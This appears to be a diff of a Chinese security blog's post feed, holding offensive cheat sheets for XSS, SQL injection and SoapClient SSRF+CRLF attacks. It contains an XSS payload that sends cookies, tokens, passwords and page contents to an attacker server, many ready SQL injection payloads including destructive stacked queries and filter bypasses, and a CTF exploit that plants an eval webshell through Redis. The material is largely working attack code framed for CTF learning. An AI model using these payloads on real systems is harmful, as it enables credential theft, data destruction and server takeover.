-遍历多个 ID&lt;script&gt;t.split(&quot;分隔符&quot;).slice(1).forEach(p=&gt;&#123;  let id=p.substring(0,40);  fetch(&quot;详情页URL&quot;+id).then(r=&gt;r.text()).then(t=&gt;&#123;    new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(t);  &#125;);&#125;);&lt;/script&gt;
-
-读什么数据的变体
-
-
-目标
-代码
-
-
-
-页面文本
-fetch(url).then(r=&gt;r.text())
-
-
-JSON 接口
-fetch(url).then(r=&gt;r.text())（text 够用）
-
-
-Cookie
-new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(document.cookie)
-
-
-localStorage
-...encodeURIComponent(localStorage.getItem(&quot;token&quot;))
-
-
-整份 DOM
-...encodeURIComponent(document.documentElement.outerHTML)
-
-
-自动填充密码
-...document.querySelector(&quot;input[type=password]&quot;).value
-
-
-当前页 URL
-...location.href
-
-
-注入点特殊情况
-
-
-情况
-约束
-对策
-
-
-
-A：二次转义（repr&#x2F;JSON）
-禁单引号、禁反斜杠
-payload 全用双引号；用 h.split(&quot;/s/&quot;)[1] 不用正则
-
-
-B：HTML 属性里
-不能有 &quot;（会闭合属性）
-用 &amp;#39;/&amp;quot; 或反引号，payload 用 &#39;...&#39;
-
-
-C：&lt;script&gt; 标签内
-防 &lt;/script&gt; 提前闭合
-&lt;/script&gt;&lt;script&gt;fetch(...)&lt;/script&gt;
-
-
-服务器监听python3 -m http.server 8080
-
-8. 绕过
-
-
-被过滤的东西
+过滤
 绕过
+示例
 
 
 
-空格（属性分隔）
-&lt;script&gt;alert(1)&lt;/script&gt;（标签内直接写 JS）；&lt;svg onload&gt;、&lt;details open ontoggle&gt;
+逗号 ,
+from x for y
+substr((select database())from 1 for 1)
 
 
-点号（属性访问）
-fetch(&quot;/&quot;)[&quot;then&quot;](function(r){return r[&quot;text&quot;]()})
+if()
+case when ... then ... end
+?sort=case when 1=1 then id else username end
+
+
+sleep
+benchmark()
+?sort=if(1=1,benchmark(10000000,md5(1)),id)
+
+
+updatexml
+extractvalue() floor()
+?sort=extractvalue(1,concat(0x7e,database()))
+
+
+空格
+/**/ 括号
+注释代替空格
+
+
+
+5. LIMIT 注入原理：LIMIT 后偏移量&#x2F;数量用户可控，直接拼接。
+代码特征：参数在 LIMIT 后面，常见于分页。
+$sql = &quot;SELECT * FROM users LIMIT &#123;$_GET[&#x27;page&#x27;]&#125;,10&quot;;
+
+危险函数：
+mysqli_query($conn, $sql)
+
+
+注入模板-- ===== 报错注入（PROCEDURE ANALYSE） =====-- 查库名?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--+-- 查表名?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)--+-- 显示不全?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32))),1)--+-- ===== 联合注入（后面无 ORDER BY 时） =====?page=1 UNION SELECT 1,2,3--+-- ===== 时间盲注 =====?page=1 and sleep(5)--+
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+示例
+
+
+
+逗号 ,
+OFFSET 语法
+LIMIT 10 OFFSET 1
+
+
+数字
+运算代替
+1+1 2*1
+
+
+PROCEDURE
+换 UNION 或盲注
+换注入方式
+
+
+
+6. IN 注入原理：IN (...) 括号内参数用户可控，直接拼接。
+代码特征：参数在 IN (...) 括号内。
+$sql = &quot;SELECT * FROM users WHERE id IN (&#123;$_GET[&#x27;ids&#x27;]&#125;)&quot;;
+
+危险函数：
+mysqli_query($conn, $sql)
+
+
+注入模板-- ① 闭合测试?ids=1) and 1=1--+-- ② 查库名?ids=1) and 1=2 union select 1,database(),3--+-- ③ 查表名?ids=1) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名?ids=1) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑤ 拿数据?ids=1) and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+说明
+
+
+
+逗号
+UNION 逐行查
+不用 group_concat
+
+
+括号
+OR 条件代替
+id=1 OR 1=2 UNION SELECT...
+
+
+空格&#x2F;关键字
+同数字型
+双写、大小写
+
+
+
+7. INSERT &#x2F; UPDATE &#x2F; DELETE 注入原理：增删改语句中存在注入，通常用报错注入或时间盲注。
+代码特征：INSERT &#x2F; UPDATE &#x2F; DELETE 语句中直接拼接用户输入。
+// INSERT$sql = &quot;INSERT INTO users(username,password) VALUES (&#x27;&#123;$_POST[&#x27;user&#x27;]&#125;&#x27;,&#x27;&#123;$_POST[&#x27;pass&#x27;]&#125;&#x27;)&quot;;// UPDATE$sql = &quot;UPDATE users SET password=&#x27;&#123;$_POST[&#x27;pass&#x27;]&#125;&#x27; WHERE id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;// DELETE$sql = &quot;DELETE FROM users WHERE id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;
+
+危险函数：
+mysqli_query($conn, $sql)mysqli_multi_query($conn, $sql)   // 支持堆叠
+
+
+注入模板-- ===== 报错注入（首选） =====-- 查库名username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- 查表名username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#-- 查列名username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),1)#-- 拿数据username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)#-- 显示不全username=admin&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)#-- ===== 时间盲注（无报错时用） =====username=admin&#x27; and if(1=1,sleep(5),0)#
+
+
+过滤绕过速查同字符型注入。重点：单引号→宽字节&#x2F;十六进制，关键字→双写&#x2F;大小写，updatexml→extractvalue&#x2F;floor。
+
+8. 堆叠注入原理：数据库支持多语句执行，用 ; 分隔执行多条 SQL。
+代码特征：使用支持多语句执行的函数。
+mysqli_multi_query($conn, $sql);
+
+PDO 默认不支持，需 PDO::ATTR_EMULATE_PREPARES =&gt; true。
+危险函数：
+mysqli_multi_query($conn, $sql)
+
+
+注入模板-- 查库?id=1;show databases;-- 查表?id=1;use 库名;show tables;-- 查当前库的表1&#x27;;show tables;-- 查列?id=1;show columns from 表名;?id=1;use 库名;show columns from 表名;-- 查内容（handler 绕过 select 过滤）?id=1;use 库名;handler 表名 open;handler 表名 read first;-- 改数据（最常用）?id=1;update users set password=&#x27;123456&#x27; where username=&#x27;admin&#x27;;-- 删数据?id=1;delete from users where id=1;-- 删表?id=1;drop table 表名;-- 查当前用户/版本?id=1;select user();?id=1;select version();
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+说明
+
+
+
+分号 ;
+过滤了就没了，换报错&#x2F;盲注
+堆叠全靠分号
+
+
+select
+用 show 代替查tables
+show tables
+
+
+select
+handler  查内容
+handler 表名 open;handler 表名 read first;
+
+
+
+9. 二次注入原理：输入入库时转义了，出库取出后直接拼 SQL，反斜杠消失，触发注入。
+代码特征：入库有过滤，出库直接拼 SQL。
+// 入库时转义（看似安全）$username = addslashes($_POST[&#x27;username&#x27;]);$sql = &quot;INSERT INTO users(username) VALUES (&#x27;$username&#x27;)&quot;;// 出库时直接拼（实际危险）$row = mysqli_fetch_assoc($result);$sql2 = &quot;SELECT * FROM users WHERE username = &#x27;&#123;$row[&#x27;username&#x27;]&#125;&#x27;&quot;;
+
+危险函数：
+addslashes()          // 入库时用的，出库后反斜杠没了mysqli_query()        // 出库后拼 SQL 执行
+
+
+注入模板-- ===== 第一步：注册带注入的账号 =====username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#password=123456-- ===== 第二步：触发注入（登录/修改密码/查询等） =====-- 用刚才注册的账号登录，出库时拼 SQL 自动触发username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#password=123456
+
+
+触发点取决于业务：修改密码、个人信息查询、留言展示等，只要从数据库取出来拼 SQL 的地方都能触发。
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+说明
+
+
+
+入库 addslashes
+没用，出库反斜杠就没了
+二次注入核心就是绕这个
+
+
+出库也转义
+那就安全了
+但很少有开发这么做
+
+
+关键字过滤
+同字符型绕过
+双写、大小写
+
+
+
+10. Cookie &#x2F; Header 注入原理：注入点在 Cookie 或 HTTP 请求头中，开发只过滤了 GET&#x2F;POST。
+代码特征：参数来源是 $_COOKIE 或 $_SERVER。
+// Cookie 注入$id = $_COOKIE[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = $id&quot;;// UA 注入$ua = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$sql = &quot;INSERT INTO log(ua) VALUES (&#x27;$ua&#x27;)&quot;;// XFF 注入$ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];$sql = &quot;INSERT INTO log(ip) VALUES (&#x27;$ip&#x27;)&quot;;
+
+危险函数：
+mysqli_query($conn, $sql)
+
+
+注入模板-- ===== Cookie 注入 =====Cookie: id=1 and 1=2 union select 1,database(),3--+-- ===== UA 注入 =====User-Agent: &#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- ===== X-Forwarded-For 注入 =====X-Forwarded-For: 127.0.0.1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- ===== Referer 注入 =====Referer: &#x27; and 1=2 union select 1,database(),3--+
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+说明
+
+
+
+只过滤 GET&#x2F;POST
+换 Cookie&#x2F;Header 注入
+审计最容易漏的地方
+
+
+IP 格式校验
+XFF 多个 IP 逗号分隔
+127.0.0.1, &#39;注入语句&#39;
+
+
+Cookie 编码
+URL 编码后再传
+看后端有没有 urldecode
+
+
+
+11. 宽字节注入原理：数据库用 GBK 等宽字节编码，addslashes() 转义的 \&#39; 被 %df 吃掉变成汉字，单引号逃逸。
+代码特征：有转义 + 数据库宽字节编码 + 没设正确连接字符集。
+$id = addslashes($_GET[&#x27;id&#x27;]);$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;// 数据库字符集：GBK / gbk / gb2312
+
+危险函数：
+addslashes()                      // 转义函数mysql_query() / mysqli_query()    // 执行 SQL
+
+
+注入模板-- ① 测试闭合?id=1%df&#x27; and 1=1--+?id=1%df&#x27; and 1=2--+-- ② 查库名?id=-1%df&#x27; union select 1,database(),3--+-- ③ 查表名?id=-1%df&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名（表名用十六进制，避免单引号）?id=-1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+-- ⑤ 拿数据?id=-1%df&#x27; union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑥ 显示不全?id=-1%df&#x27; union select 1,substr(group_concat(flag),1,32),3 from flag--+
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+说明
+
+
+
+addslashes()
+%df&#39; 宽字节
+核心绕过方式
+
+
+mysql_real_escape_string()
+没设 mysql_set_charset(&#39;gbk&#39;) 也能绕
+设了就安全了
 
 
 单引号
-改用双引号 fetch(&quot;/&quot;)
+十六进制字符串
+table_name=0x7573657273
 
 
-URL 中的点号
-十六进制 IP：http://192.168.1.100 → http://0xc0a80164
+空格&#x2F;关键字
+同字符型
+双写、大小写
 
 
-return 后需要空格
-return(fetch(&quot;/&quot;))；箭头函数 r=&gt;r[&quot;text&quot;]()
+
+附录：黑名单函数替代速查表
 
 
-标签被过滤
-换标签&#x2F;事件：&lt;svg onload&gt;、&lt;img src=x onerror&gt;、&lt;details open ontoggle&gt;
+被过滤
+替代方案
 
 
-大小写过滤
-&lt;ScRiPt&gt;、JaVaScRiPt:
+
+updatexml
+extractvalue() floor() exp()
 
 
-javascript: 被滤
-java\nscript:、HTML 实体 &amp;#106;avascript:
+extractvalue
+updatexml() floor()
 
 
-关键字被滤
-字符串拼接 alert、top[&#39;alert&#39;](1)、window[&#39;al&#39;+&#39;ert&#39;]
+floor
+updatexml() extractvalue()
 
 
-alert 被滤
-confirm(1)、prompt(1)、print()
+sleep
+benchmark(10000000,md5(1))
 
+
+if
+case when ... then ... end elt() field()
+
+
+substr
+mid() substring() left() right()
+
+
+group_concat
+concat_ws() + limit 逐行
+
+
+concat
+concat_ws() group_concat()
+
+
+union select
+报错注入、盲注、/*!union*/ /*!select*/
+
+
+information_schema
+sys.schema_auto_increment_columns mysql.innodb_table_stats
+
+
+and
+&amp;&amp; anAndd 双写
+
+
+or
+oorr 双写
+
+
+select
+大小写 SeLeCt 双写 selselectect
+
+
+from
+双写 frfromom
+
+
+where
+双写 whwhereere
+
+
+order by
+group by
+
+
+空格
+/**/ %09 %0a %0d %a0 括号 ()
+
+
+逗号 ,
+from x for y join offset
+
+
+等号 &#x3D;
+like regexp &gt; &lt; !=
+
+
+注释 # –
+;%00 /*...*/
+
+
+单引号 ‘
+宽字节 %df&#39; 十六进制 0x...
+
+
+百分号 %
+_ 匹配单字符
+
+
+limit
+limit 1 offset 0
+
+
+
+审计速记口诀
+找输入 → 找 SQL → 看拼接 → 判类型 → 测过滤 → 选姿势
+有回显用联合，有报错用报错，都没有用盲注
+90% 的注入出在 order by、like、in、数字型无过滤这四个地方
 
 ]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>XSS</tag>
-        <tag>跨站脚本</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SoapClient 进行 SSRF + CRLF</title>
+    <url>/2026/08/24/soapclient-ssrf-crlf/</url>
+    <content><![CDATA[0x01 什么是SoapSOAP是webService三要素（SOAP、WSDL、UDDI）之一：
+
+WSDL 用来描述如何访问具体的接口。
+
+UDDI用来管理，分发，查询webService。
+
+SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。
+
+
+0x02 PHP中的SoapClient类参考链接：https://www.php.net/manual/zh/soapclient.soapclient.php
+PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。
+该类的构造函数如下：
+public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
+
+第一个参数是用来指明是否是wsdl模式。
+第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。
+
+知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。
+我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url，如下
+&lt;?php$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://xxx.xxx.xxx&quot;,                                     &#x27;uri&#x27;      =&gt; &quot;123&quot;));echo serialize($a);?&gt;
+
+当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的__Call方法，然后向target_url发送一个soap请求，并且uri选项是我们可控的地方。
+0x03 CRLF InjectionCRLF是”回车 + 换行”(\r\n)的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。
+参考链接：CRLF Injection漏洞的利用与实例分析https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html
+0x04 SSRF+CRLF攻击内网实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。
+那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下：
+
+可以看到options参数中还有一个选项为user_agent，运行我们自己设置User-Agent的值。
+当我们可以控制User-Agent的值时，也就意味着我们完全可以构造一个POST请求，因为Content-Type为和Content-Length都在User-Agent之下，而控制这两个是利用CRLF发送post请求最关键的地方。
+最后给出wupco师傅的生成任意POST报文的POC:
+&lt;?php$target = &#x27;http://123.206.216.198/bbb.php&#x27;;$post_string = &#x27;a=b&amp;flag=aaa&#x27;;$headers = array(    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,    &#x27;Cookie: xxxx=1234&#x27;    );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&#x27;%0d%0a&#x27;,$aaa);$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;,$aaa);echo $aaa;?&gt;
+
+原文链接：https://blog.csdn.net/qq_42181428/article/details/100569464
+真的是反序列化(利用SoapClient触发__call用ssrf来打Redis)&lt;?phphighlight_file(__FILE__);error_reporting(0);//hint: Redis20251206class pure&#123;    public $web;    public $misc;    public $crypto;    public $pwn;    public function __construct($web, $misc, $crypto, $pwn)&#123;        $this-&gt;web = $web;        $this-&gt;misc = $misc;        $this-&gt;crypto = $crypto;        $this-&gt;pwn = $pwn;    &#125;    public function reverse()&#123;        $this-&gt;pwn = new $this-&gt;web($this-&gt;misc, $this-&gt;crypto);    &#125;    public function osint()&#123;        $this-&gt;pwn-&gt;play_0xGame();    &#125;    public function __destruct()&#123;        $this-&gt;reverse();        $this-&gt;osint();    &#125;&#125;$AI = $_GET[&#x27;ai&#x27;];$ctf = unserialize($AI);?&gt;
+
+发现没有POP链，但注意到这边 $this-&gt;pwn-&gt;play_0xGame(); 引⽤了⼀个不存在的函
+数，可以想到⽤SoapClient类，刚好访问不存在的函数可以触发它⾥⾯的 __call() ，⽽且hint写
+了 Redis20251206 ，很明显是⽤SoapClientSSRF来打Redis，⽽后⾯的20251206就是Redis的密码
+📌
+*利用SoapClient类进行SSRF+CRLF攻击:*
+https://blog.csdn.net/qq_42181428/article/details/100569464
+*soap导致的SSRF*:
+https://xz.aliyun.com/news/2640
+&lt;?phpclass pure&#123;public $web;public $misc;public $crypto;public $pwn;&#125;$a = new pure();$a-&gt;web = &#x27;SoapClient&#x27;;$a-&gt;misc = null;$target = &#x27;http://127.0.0.1:6379/&#x27;;$poc = &quot;AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SETdbfilename shell.php\r\nSET x &#x27;&lt;?= @eval(\$_POST[1]) ?&gt;&#x27;\r\nSAVE&quot;;$a-&gt;crypto = array(&#x27;location&#x27; =&gt; $target, &#x27;uri&#x27; =&gt; &quot;hello\&quot;\r\n&quot; . $poc .&quot;\r\nhello&quot;);echo urlencode(serialize($a));
+
+然后蚁剑连接后env即可
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SSRF</tag>
+        <tag>CRLF</tag>
+        <tag>SoapClient</tag>
       </tags>
   </entry>
   <entry>
